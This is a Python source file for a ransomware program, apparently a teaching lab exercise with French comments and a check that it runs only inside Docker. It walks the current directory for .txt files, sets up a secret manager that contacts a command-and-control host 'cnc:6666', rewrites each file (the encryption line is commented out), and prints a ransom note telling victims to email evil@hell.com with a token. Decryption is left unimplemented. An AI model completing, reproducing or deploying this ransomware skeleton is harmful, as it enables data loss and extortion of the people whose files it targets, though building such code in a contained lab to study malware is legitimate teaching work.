import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        #raise NotImplemented()
        # Recherche tous les fichiers correspondant au filtre dans le répertoire courant et ses sous-répertoires
        files = Path(".").rglob(filter)
        # Renvoie une liste de chemins absolus de chaque fichier correspondant
        return [str(file.absolute()) for file in files if file.is_file()]



    def encrypt(self):
        # main function for encrypting (see PDF)
        # Lister tous les fichiers txt
        files = self.get_files("*.txt")
        if not files :
            print("Pas de fichiers trouvés")
            return
        
        # Création d'un secret manager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        # Mis en place du secret
        secret_manager.setup()
        for file_path in files :
            with open(file_path, "rb") as f :
                content = f.read()
            #encrypted_content = secret_manager.encrypt(content)
            with open(file_path, "wb") as f :
                f.write(content)
        
        # Affichage du message 
        token_hex = secret_manager._token
        print (ENCRYPT_MESSAGE.format(token = token_hex))
        print("Vos fichiers ont été chiffrées")
        print(f"Veuillez nous contacter avec le jeton {secret_manager.get_hex_token ()} pour obtenir la clé de décryptage.")
        
        #raise NotImplemented() 

    def decrypt(self):
        # main function for decrypting (see PDF)
        raise NotImplemented()

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
        